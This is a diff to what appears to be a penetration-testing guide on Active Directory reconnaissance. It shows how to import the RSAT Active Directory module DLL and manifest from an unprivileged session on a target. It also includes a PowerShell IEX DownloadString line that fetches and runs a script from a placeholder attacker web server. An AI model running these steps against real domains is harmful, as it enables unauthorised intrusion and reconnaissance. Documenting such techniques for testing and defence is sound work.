@@ -48,29 +48,49 @@ The `Remote Server Administration Tools (RSAT)` suite includes a number of
 utilities useful for Active Directory reconnaissance and notably the
 `Active-Directory` module for Windows PowerShell. The `Active-Directory` module
 consolidates a group of cmdlets, that can be used to retrieve information and
-manage Active Directory domains.  
-
-While RSAT requires Administrator level-privileges to be installed, the DLL
-`Microsoft.ActiveDirectory.Management.dll` can be directly imported from an
-unprivileged user session. The DLL is usually located at the following path:
-`C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\[...]`.
-
-Once the DLL has been uploaded to the target, or made accessible on a network
-share, the Active Directory module can be imported:
+manage Active Directory domains.
 
 ```
 Import-Module ActiveDirectory
+```
+
+While the `RSAT` requires Administrator level-privileges to be installed, the
+`DLL` `Microsoft.ActiveDirectory.Management.dll` can be directly imported from
+an unprivileged user session. The `DLL` is usually located at the following
+path:
+`%SystemRoot%\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\[...]`
+on a system with the `RSAT` installed.
+
+Note however that all objects properties will not be retrieval following a
+direct import of **only** the `Microsoft.ActiveDirectory.Management.dll`. This
+can be addressed by importing the PowerShell Active Directory `module manifest`,
+with the necessary files available, after importing the module `DLL`. The files
+are usually located in
+`%SystemRoot%\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory\`.
+
+Once the `DLL` has been uploaded to the target, or made accessible on a network
+share, the Active Directory module can be imported:
+
+```bash
+# PowerShell Active Directory module DLL.
+# Copied from %SystemRoot%\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\vXXX\Microsoft.ActiveDirectory.Management.dll
 Import-Module <PATH\Microsoft.ActiveDirectory.Management.dll>
+
+# PowerShell Active Directory module manifest.
+# Required files: ActiveDirectory.Format.ps1xml, ActiveDirectory.psd1, and ActiveDirectory.Types.ps1xml.
+# Copied from %SystemRoot%\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory\.
+Import-Module <PATH\ActiveDirectory.psd1>
 
 # Necessary for some cmdlets, notably Get-Acl / Set-Acl - requires to be executed in a domain authenticated security context
 New-PSDrive -Name AD -PSProvider ActiveDirectory -Server "<DC_IP>"
 ```
 
-The `Import-ActiveDirectory.ps1` PowerShell script, in-lining
-the `Microsoft.ActiveDirectory.Management.dll`, may also be used to import the
-Active Directory module:
+The [`Import-ActiveDirectory.ps1`](https://github.com/samratashok/ADModule)
+PowerShell script, in-lining the `Microsoft.ActiveDirectory.Management.dll`,
+may also be used to import the Active Directory module:
 
 ```
+# In memory injection of the Microsoft.ActiveDirectory.Management.dll.
 IEX (new-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Import-ActiveDirectory.ps1'); Import-ActiveDirectory
 ```
 
@@ -138,8 +158,6 @@ AdFind.exe -gc -list -f (objectcategory=user) sAMAccountName objectSid
 the Windows operating system. The `DirectoryEntry` and `DirectorySearcher`
 classes can be used on Windows system to query `AD Domain Services` with the
 advantage of not requiring any additional pre-requisite or tooling.
-
-
 
 ### Active Directory forest
 
